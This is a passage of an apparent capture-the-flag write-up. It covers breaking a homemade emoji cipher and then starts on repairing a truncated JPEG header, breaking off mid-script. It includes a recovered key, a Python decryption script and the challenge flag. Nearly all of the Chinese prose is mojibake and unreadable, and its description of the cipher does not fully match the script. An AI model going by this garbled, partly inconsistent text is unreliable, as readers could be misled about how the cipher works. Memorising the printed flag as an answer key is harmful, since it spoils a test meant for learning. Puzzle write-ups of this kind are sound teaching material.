<p>é€™é¡Œçš„æ ¸å¿ƒæ˜¯ã€Œè‡ªè£½ Emoji åŠ å¯†ã€å…¶å¯¦åªæ˜¯ä¸€å€‹å¯é€†çš„ä½ç§»ç·¨ç¢¼ï¼ŒåŠ ä¸Šå¯é æ¸¬çš„ key å¾ªç’°èˆ‡å¤§é‡é‡è¤‡æ¨£æœ¬ï¼Œæ•´é«”å®‰å…¨æ€§éå¸¸è„†å¼±ã€‚</p>
<ul>
<li>
<p>æ•´é«”æµç¨‹æ¦‚è¦½</p>
<ul>
<li>ç¨‹å¼å•Ÿå‹•æ™‚æœƒè¼‰å…¥ä¸€çµ„é‡‘é‘°å­—ä¸² <code>ENC_SECRET</code>ï¼Œé è¨­å€¼æ˜¯ <code>Hi_S3cL157_xato-net</code>ï¼Œç„¶å¾Œè®€å– <code>flag.txt</code> çš„å…§å®¹ä½œç‚ºæ˜æ–‡ã€‚</li>
<li>ä¸»é‚è¼¯åœ¨ <code>encrypt_bytes</code>ï¼Œé€ byte è™•ç†è¼¸å…¥ï¼Œå°‡æ¯å€‹ byte è½‰æˆå°æ‡‰çš„ Emojiï¼Œæœ€å¾Œå¯«å‡ºåˆ° <code>flag.enc</code>ã€‚</li>
<li>ç·¨ç¢¼æ™‚ä½¿ç”¨å›ºå®š baseï¼ˆ<code>BASE = 0x1F600</code>ï¼‰å’Œç¯„åœï¼ˆ<code>RANGE = 0x4E</code>ï¼‰ï¼Œæ‰€ä»¥çµæœéƒ½è½åœ¨ä¸€å°æ®µ Emoji codepoint å€é–“ã€‚</li>
</ul>
</li>
<li>
<p>å–®ä¸€ byte çš„ Emoji ç·¨ç¢¼</p>
<ul>
<li>å°æ¯å€‹æ˜æ–‡å­—ç¯€ <code>byte</code>ï¼Œå…ˆè¨ˆç®—ç•¶å‰ç´¢å¼• <code>i</code> å°æ‡‰åˆ° key çš„ä½ç½® <code>idx</code>ï¼Œç”¨ <code>ENC_SECRET[idx]</code> åšä½ç§»ï¼Œå†æ­é… XOR ç”¢ç”Ÿä¸€å€‹åç§»é‡ <code>enc_shift</code>ã€‚</li>
<li>çœŸæ­£è¼¸å‡ºçš„å€¼æ˜¯<br />
[<br />
enc_byte = ((byte + (enc_shift \oplus RANGE)) \bmod RANGE) + BASE<br />
]<br />
å¦‚æœè½åœ¨ç‰¹å®šä¿ç•™å€é–“å‰‡å†æ¸›å» <code>ALTERNATIVE</code> åšä¿®æ­£ï¼Œç¢ºä¿æœ€å¾Œæ˜¯åˆæ³• UTF-8 Emojiã€‚</li>
<li>æŸäº›ç‰¹æ®Š byteï¼ˆä¾‹å¦‚æ›è¡Œï¼‰ä¸æœƒè½‰æˆ Emojiï¼Œè€Œæ˜¯ã€ŒåŸæ¨£è¼¸å‡ºã€ï¼Œä¸¦ä¸”ç”¨ä¾†é©…å‹•é•·åº¦ç›¸é—œçš„è¨ˆæ•¸è®Šæ•¸ï¼Œå½±éŸ¿å¾Œé¢ <code>idx</code> çš„è¨ˆç®—ã€‚</li>
</ul>
</li>
<li>
<p>ç´¢å¼•å¾ªç’°èˆ‡è¡Œç‚ºåˆ†æ</p>
<ul>
<li>key çš„ä½¿ç”¨ä½ç½®ä¸æ˜¯å–®ç´” <code>i % len(ENC_SECRET)</code>ï¼Œè€Œæ˜¯ <code>i % ((len_num * len_times) if len_num &gt; 0 else 1)</code>ï¼Œå…¶ä¸­ <code>len_num</code>ã€<code>len_times</code> åªåœ¨ç¢°åˆ°ç‰¹å®š byteï¼ˆå¯¦éš›ä¸Šå°±æ˜¯é‚£å€‹ã€Œif byte == æŸå€¼å°±åŸæ¨£è¼¸å‡ºã€çš„æ¢ä»¶ï¼‰æ™‚æ‰æœƒæ›´æ–°ã€‚</li>
<li>é€™ä»£è¡¨æ•´å€‹åŠ å¯†éç¨‹æ˜¯ã€Œè¢«åˆ†æ®µçš„ã€ï¼šæ¯æ¬¡é‡åˆ°é‚£å€‹ç‰¹æ®Šæ§åˆ¶å­—å…ƒï¼ˆä¾‹å¦‚æ›è¡Œï¼‰å°±æœƒé‡è¨­æˆ–æ”¹è®Šå¾ªç’°é•·åº¦ï¼Œå°è‡´æ¯ä¸€è¡Œçš„ key index pattern ä¸åŒã€‚</li>
<li>æª”æ¡ˆè£¡ç¬¬ä¸€å¤§æ®µé‡è¤‡çš„ <code>âœ…ğŸ˜¢ğŸ™ˆğŸ˜´</code> ç­‰ emojiï¼Œå…¶å¯¦å°±æ˜¯åˆ©ç”¨åŒä¸€å€‹æ˜æ–‡å­—ç¯€åè¦†å‡ºç¾ï¼Œè®“å°æ‡‰çš„ key ä½ç½®é‡è¤‡ï¼Œæˆç‚ºæ”»æ“Šè€…è§€å¯Ÿ key çš„çµ•ä½³æ¨£æœ¬ã€‚</li>
</ul>
</li>
<li>
<p>è§£å¯†é‚è¼¯çš„é€†å‘è¨­è¨ˆ</p>
<ul>
<li>è¦é‚„åŸæ˜æ–‡ï¼Œç¬¬ä¸€æ­¥æ˜¯æŠŠæ¯å€‹ Emoji è½‰å› Unicode codepointï¼Œå¦‚æœæ˜¯ã€Œè¢«æŒªåˆ°æ›¿ä»£å€æ®µã€çš„ï¼Œå°±åŠ å› <code>ALTERNATIVE</code>ï¼Œå†æ¸›æ‰ <code>BASE</code>ï¼Œå¾—åˆ°åŸæœ¬çš„ã€Œæ¨¡ RANGE ä¹‹å‰çš„åŠ å¯†å€¼ã€ã€‚</li>
<li>æ¥è‘—ï¼Œç”¨åŒæ¨£çš„ key byte å’Œä½ç§»è¦å‰‡ï¼ŒæŠŠ(enc_byteâˆ’BASE)modRANGE<br />
åæ¨å›bytemodRANGE<br />
å› ç‚ºé‹ç®—ä¸­æœ‰ <code>% RANGE</code>ï¼Œæ‰€ä»¥ç†è«–ä¸Šåªèƒ½æ¢å¾©ã€Œ0â€¦77 çš„æ˜æ–‡æ¨¡å€¼ã€ï¼Œä½†å°é€™é¡Œä¾†èªªï¼Œflag è¢«æ˜ å°„åˆ°ä¸€å€‹æœ‰é™å­—å…ƒé›†åˆï¼ˆASCII artï¼‰ä¸­ï¼Œé€™æ¨£çš„è³‡è¨Šå·²ç¶“è¶³å¤ è¾¨è­˜ã€‚</li>
<li>å¯¦ä½œä¸Šå°±æ˜¯ï¼š
<ul>
<li>é‚„åŸå‡ºæ¯å€‹ä½ç½®å°æ‡‰çš„ <code>enc_shift</code>ã€‚</li>
<li>ç”¨åŠ å¯†å…¬å¼åå‘æ±‚è§£åŸå§‹ byte åœ¨ <code>0..77</code> çš„å€¼ã€‚</li>
<li>æŠŠé€™äº›å€¼æ˜ å°„åˆ°ä¸€çµ„å¯è¦–å­—å…ƒè¡¨ï¼ˆä¾‹å¦‚å›ºå®šé †åºçš„ ASCII å­—å…ƒï¼‰ä¸Šï¼Œå¾—åˆ°å¯è®€å…§å®¹ã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p>åˆ©ç”¨é‡è¤‡è¡Œæ¢å¾©é‡‘é‘°</p>
<ul>
<li>é¡Œç›®çµ¦çš„ç¬¬ä¸€è¡Œæ˜¯ä¸€é•·ä¸²å®Œå…¨è¦å¾‹é‡è¤‡çš„ emoji patternï¼Œæœ¬è³ªä¸Šå°æ‡‰åŒä¸€å€‹æ˜æ–‡å­—å…ƒï¼ˆä¾‹å¦‚ç©ºç™½æˆ–æŸå€‹å›ºå®šç¬¦è™Ÿï¼‰ï¼Œç›¸ç•¶æ–¼ã€Œå·²çŸ¥æ˜æ–‡å¤§é‡é‡è¤‡ã€ã€‚</li>
<li>å°æ¯å€‹é‡è¤‡ä½ç½®ï¼Œå·²çŸ¥ï¼š
<ul>
<li>ç›¸åŒæ˜æ–‡å­—ç¯€ <code>byte</code>ã€‚</li>
<li>å°æ‡‰ emoji çš„ codepointï¼ˆå³ <code>enc_byte</code>ï¼‰ã€‚</li>
<li><code>BASE</code> èˆ‡ <code>RANGE</code> ç‚ºå¸¸æ•¸ã€‚</li>
</ul>
</li>
<li>æ–¼æ˜¯å¯ä»¥ç›´æ¥æŠŠæ–¹ç¨‹å¼ä¸­çš„ <code>ENC_SECRET[idx]</code> åæ¨å›ä¾†ï¼Œé€å€‹ä½ç½®è§£å‡º key çš„æ¯å€‹ byteï¼Œæœ€å¾Œå¾—åˆ°é•·åº¦ç‚º 12 çš„ keyï¼š<br />
<code>[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]</code><br />
ä¸¦ä¸”ç¢ºèªé€™çµ„éµå€¼æœƒåœ¨æ•´æ®µå¯†æ–‡ä¸­é€±æœŸæ€§é‡è¤‡ã€‚</li>
<li>æœ‰äº†å®Œæ•´ keyï¼Œå³å¯å°æ¯å€‹ emoji é€²è¡Œä¸Šè¿°çš„é€†é‹ç®—ï¼ŒæŠŠæ•´å€‹ <code>flag.enc</code> è½‰å›ã€Œmod 78 æ˜æ–‡ã€åºåˆ—ã€‚</li>
</ul>
</li>
<li>
<p>é‚„åŸ ASCII art èˆ‡ flag</p>
<ul>
<li>è§£ç¢¼å¾Œå¾—åˆ°çš„ä¸¦ä¸æ˜¯ç›´æ¥çš„ä¸€è¡Œ flagï¼Œè€Œæ˜¯ä¸€å€‹ç”±å¯è¦–å­—å…ƒæ§‹æˆçš„å¤§å‹ ASCII artï¼Œé¢¨æ ¼èˆ‡ FIGlet è¼¸å‡ºçš„å­—å‹ä¸€è‡´ã€‚</li>
<li>æŠŠé‚„åŸå‡ºçš„å­—å…ƒé™£åˆ—ä¾ç…§åŸå§‹æ›è¡Œé…ç½®è¼¸å‡ºï¼Œå°±èƒ½çœ‹åˆ°ä¸€å€‹å¤§å­—æ¨£ï¼Œè£¡é¢åµŒè‘—å½¢å¦‚ <code>flag{...}</code> çš„å…§å®¹ã€‚</li>
<li>å°‡é€™æ®µ ASCII art è½‰æˆåœ–ç‰‡æˆ–ç›´æ¥åœ¨ç­‰å¯¬å­—å‹çµ‚ç«¯æ©Ÿä¸­è§€çœ‹ï¼Œè‚‰çœ¼å°±å¯ä»¥è¾¨èªå‡ºçœŸæ­£çš„ flagã€‚æ•´å€‹éç¨‹åªåˆ©ç”¨ï¼š
<ul>
<li>
<p>æ¼”ç®—æ³•å¯é€†æ€§ã€‚</p>
</li>
<li>
<p>é«˜åº¦é‡è¤‡çš„å·²çŸ¥æ˜æ–‡è¡Œã€‚</p>
</li>
<li>
<p>æœ‰é™å­—å…ƒé›†åˆå°è‡´çš„æ¨¡ç©ºé–“ç¸®å°ã€‚é€™ä¹Ÿèªªæ˜äº†ã€ŒEmoji + ä½å…ƒé‹ç®—ã€ä¸¦ä¸æœƒè‡ªå‹•å¸¶ä¾†ä»»ä½•é¡å¤–å®‰å…¨æ€§ï¼Œåªæ˜¯å¦ä¸€ç¨®æ›çš®çš„å¤å…¸å¯†ç¢¼è€Œå·²ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸æ•¸å®šç¾©</span></span><br><span class="line">BASE = <span class="number">0x1F600</span></span><br><span class="line">RANGE = <span class="number">0x4E</span></span><br><span class="line">ALTERNATIVE = <span class="number">0x1CEFE</span></span><br><span class="line">KEY = [<span class="number">49</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">19</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å»ºç«‹æ•¸å€¼åˆ°å­—å…ƒçš„æ˜ å°„è¡¨</span></span><br><span class="line">VAL_TO_CHAR = &#123;</span><br><span class="line">    <span class="number">14</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="number">18</span>: <span class="string">&quot;`&quot;</span>,</span><br><span class="line">    <span class="number">32</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">    <span class="number">33</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">    <span class="number">39</span>: <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">    <span class="number">40</span>: <span class="string">&quot;(&quot;</span>,</span><br><span class="line">    <span class="number">41</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="string">&quot;,&quot;</span>,</span><br><span class="line">    <span class="number">45</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="number">47</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="number">58</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="number">60</span>: <span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_encrypted_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è®€å–ä¸¦è§£æåŠ å¯†çš„ emoji æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">    raw_data = Path(file_path).read_bytes()</span><br><span class="line">    text = raw_data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tokens = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot;\n&quot;</span>:</span><br><span class="line">            tokens.append((<span class="string">&quot;newline&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            codepoint = <span class="built_in">ord</span>(char)</span><br><span class="line">            <span class="keyword">if</span> codepoint &lt; BASE:</span><br><span class="line">                codepoint += ALTERNATIVE</span><br><span class="line">            tokens.append((<span class="string">&quot;char&quot;</span>, codepoint - BASE))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tokens</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_index_sequence</span>(<span class="params">tokens</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å»ºç«‹ç´¢å¼•åºåˆ—ç”¨æ–¼è§£å¯†&quot;&quot;&quot;</span></span><br><span class="line">    line_length = <span class="number">0</span></span><br><span class="line">    line_count = <span class="number">0</span></span><br><span class="line">    index_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        idx = i % (line_length * line_count) <span class="keyword">if</span> line_length &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        index_list.append(idx)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> line_length == <span class="number">0</span>:</span><br><span class="line">                line_length = i + <span class="number">1</span></span><br><span class="line">            line_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> index_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_tokens</span>(<span class="params">tokens, index_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è§£å¯† token åºåˆ—&quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(tokens)</span><br><span class="line">    plaintext_mod = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, value) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            plaintext_mod.append(<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        key_value = KEY[index_list[i] % <span class="built_in">len</span>(KEY)]</span><br><span class="line">        shift = (length - i) % <span class="number">4</span></span><br><span class="line">        decrypted_value = (value - (key_value &lt;&lt; shift)) % RANGE</span><br><span class="line">        plaintext_mod.append(decrypted_value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_ascii_art</span>(<span class="params">plaintext_mod</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°‡è§£å¯†å¾Œçš„æ•¸å€¼è½‰æ›ç‚º ASCII è—è¡“å­—å…ƒ&quot;&quot;&quot;</span></span><br><span class="line">    ascii_chars = []</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> plaintext_mod:</span><br><span class="line">        <span class="keyword">if</span> value == <span class="number">10</span>:</span><br><span class="line">            ascii_chars.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ascii_chars.append(VAL_TO_CHAR.get(value, <span class="string">&quot;?&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(ascii_chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_ascii_art_to_image</span>(<span class="params">ascii_text, output_path, font_size=<span class="number">16</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°‡ ASCII è—è¡“æ¸²æŸ“æˆåœ–ç‰‡&quot;&quot;&quot;</span></span><br><span class="line">    lines = ascii_text.splitlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å˜—è©¦è¼‰å…¥å­—é«”</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        font = ImageFont.truetype(<span class="string">&quot;consola.ttf&quot;</span>, font_size)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            font = ImageFont.truetype(<span class="string">&quot;Courier New.ttf&quot;</span>, font_size)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            font = ImageFont.load_default()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¨ˆç®—åœ–ç‰‡å°ºå¯¸</span></span><br><span class="line">    max_line_length = <span class="built_in">max</span>(<span class="built_in">len</span>(line) <span class="keyword">for</span> line <span class="keyword">in</span> lines) <span class="keyword">if</span> lines <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    char_width = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    line_height = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">3</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    image_width = max_line_length * char_width + <span class="number">10</span></span><br><span class="line">    image_height = line_height * <span class="built_in">len</span>(lines) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å»ºç«‹åœ–ç‰‡ä¸¦ç¹ªè£½æ–‡å­—</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (image_width, image_height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">    y_position = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        draw.text((<span class="number">5</span>, y_position), line, fill=<span class="string">&quot;black&quot;</span>, font=font)</span><br><span class="line">        y_position += line_height</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å„²å­˜åœ–ç‰‡</span></span><br><span class="line">    img.save(output_path)</span><br><span class="line">    <span class="keyword">return</span> output_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸»ç¨‹å¼æµç¨‹&quot;&quot;&quot;</span></span><br><span class="line">    input_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\flag.enc&quot;</span>)</span><br><span class="line">    output_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\ascii_art.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 1: è§£æåŠ å¯†æª”æ¡ˆ</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è§£æåŠ å¯†æª”æ¡ˆ...&quot;</span>)</span><br><span class="line">    tokens = parse_encrypted_file(input_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 2: å»ºç«‹ç´¢å¼•åºåˆ—</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨å»ºç«‹ç´¢å¼•åºåˆ—...&quot;</span>)</span><br><span class="line">    index_list = build_index_sequence(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 3: è§£å¯†</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è§£å¯†...&quot;</span>)</span><br><span class="line">    plaintext_mod = decrypt_tokens(tokens, index_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 4: è½‰æ›ç‚º ASCII è—è¡“</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨è½‰æ›ç‚º ASCII è—è¡“...&quot;</span>)</span><br><span class="line">    ascii_art = convert_to_ascii_art(plaintext_mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ­¥é©Ÿ 5: æ¸²æŸ“æˆåœ–ç‰‡</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ­£åœ¨æ¸²æŸ“åœ–ç‰‡...&quot;</span>)</span><br><span class="line">    result_path = render_ascii_art_to_image(ascii_art, output_file)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å®Œæˆï¼åœ–ç‰‡å·²å„²å­˜è‡³: <span class="subst">&#123;result_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nASCII è—è¡“é è¦½:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ascii_art[:<span class="number">500</span>] + <span class="string">&quot;...&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(ascii_art) &gt; <span class="number">500</span> <span class="keyword">else</span> ascii_art)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/FhCTF/33.webp" alt="image" /></p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">FhCTF</span><span class="template-variable">&#123;S1mpl3_FL46_We4k_P4ss&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="des-lv1-è€èˆ¹é•·çš„å¯¶è—"><a class="markdownIt-Anchor" href="#des-lv1-è€èˆ¹é•·çš„å¯¶è—"></a> DES Lv.1 - è€èˆ¹é•·çš„å¯¶è—</h3>
<ul>
<li>
<p>Part 1: JPEG é«˜åº¦ä¿®å¾© (Image Forensics)</p>
<ul>
<li>
<p>é¡Œç›®åˆ†æ</p>
<p><strong>ç›®æ¨™æª”æ¡ˆ</strong>: <code>treasuremap.webp</code><br />
<strong>ç¾è±¡</strong>: åœ–ç‰‡åº•éƒ¨è¢«æˆªæ–·ï¼Œç„¡æ³•çœ‹åˆ°å®Œæ•´å…§å®¹<br />
<strong>åŸå› </strong>: JPEG æª”æ¡ˆçš„é«˜åº¦æ•¸å€¼åœ¨ Hex Header ä¸­è¢«æƒ¡æ„ä¿®æ”¹ï¼Œå°è‡´ç€è¦½å™¨åªæ¸²æŸ“ä¸ŠåŠéƒ¨åˆ†ï¼Œåº•éƒ¨çš„é—œéµè³‡è¨Šè¢«éš±è—[1]</p>
</li>
<li>
<p>æ ¸å¿ƒåŸç†</p>
<p>JPEG æª”æ¡ˆæ ¼å¼ä½¿ç”¨ SOF (Start of Frame) å€å¡Šå„²å­˜åœ–ç‰‡å°ºå¯¸è³‡è¨Š ï¼š</p>
<p><strong>SOF æ¨™è¨˜</strong>: <code>FF C0</code> (Baseline DCT) æˆ– <code>FF C2</code> (Progressive DCT)<br />
<strong>çµæ§‹</strong>: <code>[FF C0] [é•·åº¦(2bytes)] [ç²¾åº¦(1byte)] [é«˜åº¦(2bytes)] [å¯¬åº¦(2bytes)]</code><br />
<strong>ä½å…ƒçµ„åº</strong>: Big-Endian (å¤§ç«¯åº)</p>
<p>ç•¶é«˜åº¦è¢«äººç‚ºæ”¹å°æ™‚ï¼Œåœ–ç‰‡æª¢è¦–å™¨æœƒå¿½ç•¥è¶…å‡ºé«˜åº¦çš„åƒç´ è³‡æ–™ï¼Œä½†é€™äº›è³‡æ–™ä»å®Œæ•´ä¿ç•™åœ¨æª”æ¡ˆä¸­ã€‚åªè¦å°‡é«˜åº¦å€¼æ¢å¾©æˆ–èª¿å¤§ï¼Œéš±è—çš„å…§å®¹å°±æœƒé¡¯ç¤ºå‡ºä¾†</p>
</li>
<li>
<p>è…³æœ¬</p>
<p>A. è®€å–èˆ‡æœå°‹ SOF æ¨™è¨˜</p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap.webp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœå°‹æ‰€æœ‰ SOF æ¨™è¨˜ (FF C0 æˆ– FF C2)</span></span><br><span 